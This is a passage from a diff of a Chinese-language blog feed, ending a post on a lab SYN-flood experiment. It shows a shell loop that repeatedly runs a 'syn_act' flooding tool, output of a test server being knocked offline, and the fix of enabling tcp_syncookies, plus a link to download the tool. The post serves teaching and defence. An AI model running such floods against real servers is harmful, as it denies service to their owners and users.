+</span><span class='line'><span class="k">while</span> <span class="o">[</span> <span class="s2">&quot;1&quot;</span> <span class="o">=</span> <span class="s2">&quot;1&quot;</span> <span class="o">]</span>;
+</span><span class='line'><span class="k">do</span>
+</span><span class='line'><span class="k">    </span>sudo ./syn_act <span class="nv">$ip</span>
+</span><span class='line'><span class="k">done</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>运行攻击</p>
+
+<p><code>./run.sh</code></p>
+
+<p>查看服务器的tcp状态,发现 SYN_RECV 数值很高</p>
+
+<pre><code>SYN_RECV 1537
+ESTABLISHED 6
+</code></pre>
+
+<p>在另外一台机器上 curl 请求测试服务器的nginx,显示无法连接服务器。</p>
+
+<pre><code>$time curl http://172.16.5.69/index.html
+curl: (7) couldn't connect to host
+
+real    0m14.149s
+user    0m0.004s
+sys     0m0.004s
+</code></pre>
+
+<h3>服务端防御</h3>
+
+<h4>终于说到我们做这个实验的目的了，内牛满面啊</h4>
+
+<p>解决方案有很多，这里介绍一种方案：</p>
+
+<p><code>syn_cookie</code>，你可以在<a href="http://www.ibm.com/developerworks/cn/linux/l-syncookie/">这里</a>学习到<code>syn_cookie</code>的工作原理。</p>
+
+<h4>开启 <code>syn_cookie</code></h4>
+
+<p>修改<code>/etc/sysctl.conf</code>文件，添加参数</p>
+
+<pre><code>net.ipv4.tcp_syncookies = 1
+</code></pre>
+
+<p>运行下面命令，让配置文件生效</p>
+
+<pre><code>sudo sysctl -p
+</code></pre>
+
+<p>运行 syn_act 攻击测试服务器,查看服务器的tcp状态,发现 SYN_RECV 数值依旧很高</p>
+
+<pre><code>SYN_RECV 1537
+ESTABLISHED 6
+</code></pre>
+
+<p>但是，这一次在另外一台机器上用 curl 请求测试服务器，nginx表示毫无鸭梨，立即就返回了结果</p>
+
+<pre><code>$time curl http://172.16.5.69/index.html
+hello
+
+real    0m0.082s
+user    0m0.004s
+sys     0m0.003s
+</code></pre>
+
+<p>注：<code>syn_cookie</code> 在大部分linux系统下默认是开启的，你可以通过 <code>sysclt -a|grep tcp_syncookies</code> 查看下是否已经开启 :)</p>
+
+<p>总结: <code>syn flood doc</code> 是比较老的攻击手段，目前已经有很多很好的解决方案提供支持，
+甚至大部分linux系统默认设置就能抵挡一定量的攻击,小伙伴们尽可放心的使用你们的linux服务器把 :)</p>
+
+<p>最后，把上面的代码打包下, 方便做实验的小伙伴们，点击<a href="http://sunkid.me/download/syn_act.zip">这里</a>就可以下载到哦。</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[GIT SSH的权限问题]]></title>
